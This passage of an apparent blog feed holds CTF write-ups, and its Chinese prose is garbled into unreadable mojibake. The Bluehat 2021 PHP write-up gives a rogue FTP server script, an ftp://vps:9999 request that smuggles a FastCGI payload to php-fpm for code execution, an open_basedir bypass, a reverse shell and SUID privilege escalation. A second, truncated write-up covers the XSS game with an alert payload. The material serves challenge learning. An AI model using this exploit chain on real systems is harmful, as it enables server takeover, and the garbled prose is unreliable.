è¾“æ¨¡å¼çš„ä¸åŒä¹‹å¤„ä½“ç°åœ¨æ•°æ®è¿æ¥çš„å»ºç«‹ï¼Œå¯¹äºæ•°æ®è¿æ¥çš„å»ºç«‹ï¼Œä¸»è¢«åŠ¨æ¨¡å¼çš„ä¸åŒåœ¨äºæ•°æ®è¿æ¥çš„å»ºç«‹â€œæœåŠ¡å™¨â€æ˜¯â€œä¸»åŠ¨â€è¿˜æ˜¯â€è¢«åŠ¨â€ï¼š</p><p>port æœåŠ¡å™¨é€šè¿‡æ§åˆ¶è¿æ¥çŸ¥é“å®¢æˆ·ç«¯ç›‘å¬çš„ç«¯å£åï¼Œä½¿ç”¨è‡ªå·±çš„ 20 å·ç«¯å£ä½œä¸ºæºç«¯å£ï¼ŒæœåŠ¡å™¨â€œä¸»åŠ¨â€å‘èµ· tcp æ•°æ®è¿æ¥ã€‚</p><p>pasv æœåŠ¡å™¨ç›‘å¬ 1024-65535 çš„ä¸€ä¸ªéšæœºç«¯å£ï¼Œå¹¶é€šè¿‡æ§åˆ¶è¿æ¥å°†è¯¥ç«¯å£å‘Šè¯‰å®¢æˆ·ç«¯ï¼Œå®¢æˆ·ç«¯å‘æœåŠ¡å™¨çš„è¯¥ç«¯å£å‘èµ· tcp æ•°æ®è¿æ¥ï¼Œè¿™ç§æƒ…å†µä¸‹æ•°æ®è¿æ¥çš„å»ºç«‹ç›¸å½“äºæœåŠ¡å™¨æ˜¯â€œè¢«åŠ¨â€çš„ã€‚</p><img src="/article/bluehat2021/t012739ba782705dcdd.jpg" class="" title="ftp" loading="lazy"><p>å¦‚å›¾ï¼Œå¯¹äºæˆ‘ä»¬è¿™é¢˜ï¼Œæ˜¾ç„¶åªèƒ½ç”¨ pasv æ¨¡å¼ï¼ŒæœåŠ¡å™¨ç›‘å¬çš„â€œéšæœºç«¯å£â€å¯¹åº” php-fpm ç›‘å¬çš„ 9000 ç«¯å£ï¼Œè¯¦ç»†è¿‡ç¨‹æˆ‘ä»¬é€šè¿‡ä¸€ä¸ªå®é™…çš„ pasv ä¾‹å­æ¥ç†è§£ï¼š</p><pre class="language-none"><code class="language-none">testbox1: &#123;&#x2F;home&#x2F;p-t&#x2F;slacker&#x2F;public_html&#125; % ftp -d testbox2Connected to testbox2.slacksite.com.220 testbox2.slacksite.com FTP server ready.Name (testbox2:slacker): slacker---&gt; USER slacker331 Password required for slacker.Password: TmpPass---&gt; PASS XXXX230 User slacker logged in.---&gt; SYST215 UNIX Type: L8Remote system type is UNIX.Using binary mode to transfer files.ftp&gt; passivePassive mode on.ftp&gt; lsftp: setsockopt (ignored): Permission denied---&gt; PASV227 Entering Passive Mode (192,168,150,90,195,149).---&gt; LIST150 Opening ASCII mode data connection for file listdrwx------   3 slacker    users         104 Jul 27 01:45 public_html226 Transfer complete.ftp&gt; quit---&gt; QUIT221 Goodbye.</code></pre><p>ä»¥ä¸Šæ˜¯å®¢æˆ·ç«¯ testbox1.slacksite.com (192.168.150.80) å‘å‡º <code>PASV</code> å‘½ä»¤ä»¥æŒ‡ç¤ºå…¶å°†ç­‰å¾…æœåŠ¡å™¨ testbox2.slacksite.com (192.168.150.90) â€œè¢«åŠ¨åœ°â€æä¾› ip å’Œç«¯å£å·ï¼Œç„¶åå®¢æˆ·ç«¯å°†åˆ›å»ºåˆ°æœåŠ¡å™¨çš„æ•°æ®è¿æ¥ï¼Œå…¶ä¸­ï¼š</p><pre class="language-none"><code class="language-none">227 Entering Passive Mode (192,168,150,90,195,149).</code></pre><p>è¿™å°±æ˜¯æœåŠ¡å™¨â€œè¢«åŠ¨â€è¿”å›çš„ ip å’Œç«¯å£å·ï¼Œåˆ†åˆ«æ˜¯ 32 ä½çš„ä¸»æœºåœ°å€å’Œ 16 ä½ tcp ç«¯å£åœ°å€ï¼Œè¿™ä¸ªä¾‹å­çš„å°±æ˜¯ 192.168.150.90 çš„ 195*256 + 149 = 50069 ç«¯å£ã€‚</p><p>é€‰æ‹© ip åœ°å€å’Œç«¯å£å·åï¼Œé€‰æ‹© ip åœ°å€å’Œç«¯å£çš„ä¸€æ–¹å°†å¼€å§‹ä¾¦å¬æŒ‡å®šçš„åœ°å€/ç«¯å£ï¼Œå¹¶ç­‰å¾…å¦ä¸€æ–¹è¿æ¥ã€‚ å½“å¯¹æ–¹è¿æ¥åˆ°æ”¶å¬æ–¹åï¼Œæ•°æ®ä¼ è¾“å¼€å§‹ã€‚</p><p>æˆ‘ä»¬è¿™é¢˜éœ€è¦å°† ip ç«¯å£é‡å®šå‘ä¸º 127.0.0.1:9000 æ¥è¯•å›¾ ssrf ï¼Œ9000 % 256 = 40 ï¼Œå³å¯è¡¨è¾¾ä¸ºï¼š</p><pre class="language-none"><code class="language-none">227 Entering Passive Mode (127,0,0,1,35,40).</code></pre></blockquote><p><code>file_put_contents()</code> ç”¨ <code>ftp://</code> ä¸æˆ‘ä»¬çš„æ¶æ„æœåŠ¡å™¨å»ºç«‹æ§åˆ¶è¿æ¥ï¼Œä½¿ç›®æ ‡å‘é€ <code>PASV</code> å‘½ä»¤ï¼Œæˆ‘ä»¬â€œè¢«åŠ¨â€æä¾› ip ç«¯å£è‡³æœ¬åœ° 9001ç«¯å£ï¼Œç„¶åå»ºç«‹èµ·æ•°æ®è¿æ¥ï¼Œå°† data ï¼ˆfastcgi payloadï¼‰çš„å†…å®¹æ‰“åˆ°FastCGIæœåŠ¡</p><p>åœ¨<code>/var/www/html</code>ç›®å½•å†™æ–‡ä»¶<code>file.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token single-quoted-string string">'/tmp/file'</span><span class="token punctuation">;</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'data'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token single-quoted-string string">':)'</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;/br>"</span><span class="token punctuation">.</span><span class="token variable">$data</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;/br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// echo file_get_contents($file);</span></span></code></pre><p>å‡†å¤‡åˆ©ç”¨å‰é¢ç”Ÿæˆçš„payloadæ‰“</p><h3 id="èµ·æ¶æ„ftpæœåŠ¡"><a href="#èµ·æ¶æ„ftpæœåŠ¡" class="headerlink" title="èµ·æ¶æ„ftpæœåŠ¡"></a>èµ·æ¶æ„ftpæœåŠ¡</h3><p>ç”¨å¦‚ä¸‹è„šæœ¬ï¼Œåœ¨å…¬ç½‘vpsèµ·</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sockets <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span> s<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>conn<span class="token punctuation">,</span> addr <span class="token operator">=</span> s<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'220 welcome\n'</span><span class="token punctuation">)</span><span class="token comment">#Service ready for new user.</span><span class="token comment">#Client send anonymous username</span><span class="token comment">#USER anonymous</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'331 Please specify the password.\n'</span><span class="token punctuation">)</span><span class="token comment">#User name okay, need password.</span><span class="token comment">#Client send anonymous password.</span><span class="token comment">#PASS anonymous</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'230 Login successful.\n'</span><span class="token punctuation">)</span><span class="token comment">#User logged in, proceed. Logged out if appropriate.</span><span class="token comment">#TYPE I</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'200 Switching to Binary mode.\n'</span><span class="token punctuation">)</span><span class="token comment">#Size /</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'550 Could not get the file size.\n'</span><span class="token punctuation">)</span><span class="token comment">#EPSV (1)</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'150 ok\n'</span><span class="token punctuation">)</span><span class="token comment">#PASV</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'227 Entering Extended Passive Mode (127,0,0,1,0,9001)\n'</span><span class="token punctuation">)</span> <span class="token comment">#STOR / (2) æ³¨æ„æ‰“åˆ°9001ç«¯å£çš„æœåŠ¡</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'150 Permission denied.\n'</span><span class="token punctuation">)</span><span class="token comment">#QUIT</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'221 Goodbye.\n'</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h3 id="å¹²"><a href="#å¹²" class="headerlink" title="å¹²"></a>å¹²</h3><p>å¹²å°±å®Œäº‹äº†ï¼Œè®¿é—®<code>file.php</code>ç”¨payloadæ‰“</p><p><code>./file.php?file=ftp://vps:9999/&amp;data=xxx</code></p><img src="/article/bluehat2021/image-20210503144504813.png" class="" title="gan" loading="lazy"><p>å¯ä»¥çœ‹åˆ°dumpå‡ºæ¥<code>int(681)</code>ï¼Œè¿™é‡Œå°±æ˜¯æ‰“çš„æ•°æ®åŒ…å¤§å°</p><p>è¿™æ—¶å·²ç»çªç ´open_basedirï¼Œå¯ä»¥ä»»æ„è®¿é—®ç›®å½•äº†ï¼ŒåŒæ—¶ä¹Ÿæ‰§è¡Œäº†æ¶æ„.soæ–‡ä»¶</p><img src="/article/bluehat2021/image-20210503144951807.png" class="" title="ls&#x2F;" loading="lazy"><p>ä¸‹é¢å°±æ˜¯suidææƒäº†ï¼Œé‚£ä¹ˆå¤§ä¸€ä¸ª700 flagå°±åœ¨çœ¼å‰</p><h3 id="æ‹¿shell"><a href="#æ‹¿shell" class="headerlink" title="æ‹¿shell"></a>æ‹¿shell</h3><p>æ—¢ç„¶å¯ä»¥æ‰§è¡Œæ¶æ„.soæ–‡ä»¶ï¼Œé‚£ä¹ˆç›´æ¥å¼¹ä¸ªshellå›æ¥</p><img src="/article/bluehat2021/image-20210503145246770.png" class="" title="shell" loading="lazy"><p>åœ¨web shellä¸Šä¼ è‡ªåŠ¨åŒ–ææƒæ¢æµ‹è„šæœ¬ï¼Œè¿™é‡Œç”¨çš„æ˜¯<a href="https://github.com/rebootuser/LinEnum">LinEnum</a>ï¼Œæ‰§è¡Œè„šæœ¬ï¼Œè¿™é‡Œä¸Šä¼ åˆ°å“ªéƒ½å¯ä»¥ï¼Œæ¯•ç«Ÿå·²ç»çªç ´äº†é™åˆ¶è¿˜å¼¹äº†shell</p><pre class="language-none"><code class="language-none">&#x2F;var&#x2F;www&#x2F;html&#x2F;LinEnum.sh -s -r report -e &#x2F;tmp&#x2F; -t</code></pre><p>æŸ¥çœ‹report</p><img src="/article/bluehat2021/image-20210503145518039.png" class="" title="report" loading="lazy"><p>æ²¡æƒ³åˆ°phpå°±æœ‰sæƒé™ï¼Œç›´æ¥è¿è¡Œå³å¯</p><p>å†™æ–‡ä»¶</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'gyy'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'gyy'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'open_basedir'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'open_basedir'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/flag"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>ç›´æ¥è¿è¡Œ</p><img src="/article/bluehat2021/image-20210503145751850.png" class="" title="flag" loading="lazy"><p>GET IT</p><p>å…³äºphpfpmä¸FastCGIæ¨¡å¼çš„ç ”ç©¶å»ºè®®ä»”ç»†çœ‹çœ‹éƒ¨åˆ†å‚è€ƒæ–‡ç« ï¼Œæ€»çš„æ¥è¯´å°±æ˜¯</p><p>FastCGIåŠ è½½å¹¶è°ƒç”¨hpdoger.so-&gt;bypass base_opendir-&gt;ftp-ssrfè¯·æ±‚æ¶æ„ftpæœåŠ¡-&gt;æœ¬åœ°php-fpm-&gt;rce</p><hr><p>å‚è€ƒæ–‡ç« ï¼š</p><p><a href="https://ha1c9on.top/2021/04/29/lmb_one_pointer_php/">Ha1c9on</a></p><p><a href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html">PHPç»•è¿‡open_basediråˆ—ç›®å½•çš„ç ”ç©¶</a></p><p><a href="https://www.php.net/manual/zh/wrappers.glob.php">glob://</a></p><p><a href="https://xz.aliyun.com/t/5598">php-fpmçš„æ”»å‡»æ–¹å¼</a></p><p><a href="https://www.cnblogs.com/leixiao-/p/10226633.html">PHP-FPM Fastcgi æœªæˆæƒè®¿é—®æ¼æ´</a></p><p><a href="https://www.anquanke.com/post/id/186186#h3-3">Fastcgiç»•è¿‡å§¿åŠ¿</a></p><p><a href="https://www.anquanke.com/post/id/233454">åˆ©ç”¨ftp ä¸ php-fpm å¯¹è¯ RCE</a></p><p><a href="https://buuoj.cn/challenges#[%E8%93%9D%E5%B8%BD%E6%9D%AF%202021]One%20Pointer%20PHP">å¤ç°å¹³å°buuoj</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;æ·±å…¥å­¦ä¹ è“å¸½æ¯webä¸€é“é¢˜&lt;/p&gt;</summary>
    
    
    
    <category term="Write-Up" scheme="https://err0r.top/categories/Write-Up/"/>
    
    
  </entry>
  
  <entry>
    <title>xsså­¦ä¹ </title>
    <link href="https://err0r.top/article/xss/"/>
    <id>https://err0r.top/article/xss/</id>
    <published>2021-04-24T05:24:44.000Z</published>
    <updated>2021-04-26T07:17:46.910Z</updated>
    
    <content type="html"><![CDATA[<p>è°·æ­Œçš„å°æ¸¸æˆï¼Œå¤ä¹ ä¸€ä¸‹xss</p><a id="more"></a><p>é¡¹ç›®åœ°å€ï¼š<a href="https://xss-game.appspot.com/">https://xss-game.appspot.com/</a></p><h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><p><a href="https://xss-game.appspot.com/level1/frame">https://xss-game.appspot.com/level1/frame</a></p><pre class="language-python" data-language="python"><code class="language-python">page_header <span class="token operator">=</span> <span class="token triple-quoted-string string">"""&lt;!doctype html>&lt;html>  &lt;head>    &lt;!-- Internal game scripts/styles, mostly boring stuff -->    &lt;script src="/static/game-frame.js">&lt;/script>    &lt;link rel="stylesheet" href="/static/game-frame-styles.css" />  &lt;/head>   &lt;body id="level1">    &lt;img src="/static/logos/level1.png">      &lt;div>"""</span> page_footer <span class="token operator">=</span> <span class="token triple-quoted-string string">"""    &lt;/div>  &lt;/body>&lt;/html>"""</span> main_page_markup <span class="token operator">=</span> <span class="token triple-quoted-string string">"""&lt;form action="" method="GET">  &lt;input id="query" name="query" value="Enter query here..."    onfocus="this.value=''">  &lt;input id="button" type="submit" value="Search">&lt;/form>"""</span> <span class="token keyword">class</span> <span class="token class-name">MainPage</span><span class="token punctuation">(</span>webapp<span class="token punctuation">.</span>RequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">def</span> <span class="token function">render_string</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">:</span>    self<span class="token punctuation">.</span>response<span class="token punctuation">.</span>out<span class="token punctuation">.</span>write<span class="token punctuation">(</span>s<span class="token punctuation">)</span>   <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># Disable the reflected XSS filter for demonstration purposes</span>    self<span class="token punctuation">.</span>response<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>add_header<span class="token punctuation">(</span><span class="token string">"X-XSS-Protection"</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>     <span class="token keyword">if</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'query'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token comment"># Show main search page</span>      self<span class="token punctuation">.</span>render_string<span class="token punctuation">(</span>page_header <span class="token operator">+</span> main_page_markup <span class="token operator">+</span> page_footer<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>      query <span class="token operator">=</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'query'</span><span class="token punctuation">,</span> <span class="token string">'[empty]'</span><span class="token punctuation">)</span>             <span class="token comment"># Our search engine broke, we found no results :-(</span>      message <span class="token operator">=</span> <span class="token string">"Sorry, no results were found for &lt;b>"</span> <span class="token operator">+</span> query <span class="token operator">+</span> <span class="token string">"&lt;/b>."</span>      message <span class="token operator">+=</span> <span class="token string">" &lt;a href='?'>Try again&lt;/a>."</span>       <span class="token comment"># Display the results page</span>      self<span class="token punctuation">.</span>render_string<span class="token punctuation">(</span>page_header <span class="token operator">+</span> message <span class="token operator">+</span> page_footer<span class="token punctuation">)</span>         <span class="token keyword">return</span> application <span class="token operator">=</span> webapp<span class="token punctuation">.</span>WSGIApplication<span class="token punctuation">(</span><span class="token punctuation">[</span> <span class="token punctuation">(</span><span class="token string">'.*'</span><span class="token punctuation">,</span> MainPage<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></code></pre><p>å…³é”®éƒ¨åˆ†</p><pre class="language-python" data-language="python"><code class="language-python">query <span class="token operator">=</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'query'</span><span class="token punctuation">,</span> <span class="token string">'[empty]'</span><span class="token punctuation">)</span>             <span class="token comment"># Our search engine broke, we found no results :-(</span>      message <span class="token operator">=</span> <span class="token string">"Sorry, no results were found for &lt;b>"</span> <span class="token operator">+</span> query <span class="token operator">+</span> <span class="token string">"&lt;/b>."</span>      message <span class="token operator">+=</span> <span class="token string">" &lt;a href='?'>Try again&lt;/a>."</span></code></pre><p><code>Sorry, no results were found for &lt;b&gt; + query + &lt;/b&gt;.</code></p><p>GETè¯·æ±‚queryä¼šç›´æ¥å¡«å…¥ç½‘é¡µhtml</p><img src="/article/xss/image-20210424143837616.png" class="" title="level1-1" loading="lazy"><p>ç›´æ¥æ‰“å³å¯ï¼Œpayload:</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><img src="/article/xss/image-20210424143953579.png" class="" title="level1-2" loading="lazy"><hr><h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p><a href="https://xss-game.appspot.com/level2/frame">https://xss-game.appspot.com/level2/frame</a></p><p>æºç Â·index.html</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token name">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame-styles.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>     <span class="token comment">&lt;!-- This is our database of messages --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/post-store.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">      <span class="token keyword">var</span> defaultMessage <span class="token operator">=</span> <span class="token string">"Welcome!&lt;br>&lt;br>This is your &lt;i>personal&lt;/i>"</span>        <span class="token operator">+</span> <span class="token string">" stream. You can post anything you want here, especially "</span>        <span class="token operator">+</span> <span class="token string">"&lt;span style='color: #f00ba7'>madness&lt;/span>."</span><span class="token punctuation">;</span>       <span class="token keyword">var</span> <span class="token constant">DB</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PostDB</span><span class="token punctuation">(</span>defaultMessage<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">function</span> <span class="token function">displayPosts</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> containerEl <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"post-container"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        containerEl<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>         <span class="token keyword">var</span> posts <span class="token operator">=</span> <span class="token constant">DB</span><span class="token punctuation">.</span><span class="token function">getPosts</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>posts<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">var</span> html <span class="token operator">=</span> <span class="token string">'&lt;table class="message"> &lt;tr> &lt;td valign=top> '</span>            <span class="token operator">+</span> <span class="token string">'&lt;img src="/static/level2_icon.png"> &lt;/td> &lt;td valign=top '</span>            <span class="token operator">+</span> <span class="token string">' class="message-container"> &lt;div class="shim">&lt;/div>'</span><span class="token punctuation">;</span>           html <span class="token operator">+=</span> <span class="token string">'&lt;b>You&lt;/b>'</span><span class="token punctuation">;</span>          html <span class="token operator">+=</span> <span class="token string">'&lt;span class="date">'</span> <span class="token operator">+</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span>posts<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>date<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'&lt;/span>'</span><span class="token punctuation">;</span>          html <span class="token operator">+=</span> <span class="token string">"&lt;blockquote>"</span> <span class="token operator">+</span> posts<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>message <span class="token operator">+</span> <span class="token string">"&lt;/blockquote"</span><span class="token punctuation">;</span>          html <span class="token operator">+=</span> <span class="token string">"&lt;/td>&lt;/tr>&lt;/table>"</span>          containerEl<span class="token punctuation">.</span>innerHTML <span class="token operator">+=</span> html<span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>       window<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'clear-form'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function-variable function">onsubmit</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token constant">DB</span><span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token function">displayPosts</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>         document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'post-form'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function-variable function">onsubmit</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">var</span> message <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'post-content'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>          <span class="token constant">DB</span><span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span>message<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token function">displayPosts</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>          document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'post-content'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>         <span class="token function">displayPosts</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>     </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>level2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token 